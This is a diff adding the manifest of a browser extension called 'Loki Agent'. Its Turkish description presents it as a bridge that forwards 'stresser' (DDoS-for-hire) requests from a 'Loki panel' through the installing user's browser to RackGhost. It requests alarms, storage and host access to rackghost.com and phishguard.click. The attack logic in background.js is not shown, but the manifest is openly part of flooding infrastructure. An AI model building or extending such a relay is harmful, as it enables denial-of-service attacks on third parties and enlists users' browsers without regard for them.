@@ -1,0 +1,18 @@
+{
+  "manifest_version": 3,
+  "name": "Loki Agent",
+  "version": "1.0",
+  "description": "Loki panel <-> RackGhost koprusu. Loki panelinden gelen stresser isteklerini bu tarayici uzerinden iletir.",
+  "permissions": ["alarms", "storage"],
+  "host_permissions": [
+    "https://rackghost.com/*",
+    "https://phishguard.click/*"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "icons": {
+    "48": "icon48.png",
+    "128": "icon128.png"
+  }
+}
